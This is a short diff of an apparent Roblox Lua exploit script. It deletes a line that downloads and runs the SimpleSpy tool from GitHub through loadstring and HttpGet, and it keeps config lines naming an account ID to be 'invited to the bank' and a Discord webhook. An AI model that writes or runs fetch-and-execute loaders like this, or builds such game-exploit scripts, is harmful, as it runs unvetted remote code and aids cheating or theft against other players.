@@ -1,6 +1,3 @@
-`-- SimpleSpy API 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua", true))()
-
 -- The ID that will get invited to the bank
 local id = 3784550535
 -- Discord webhook
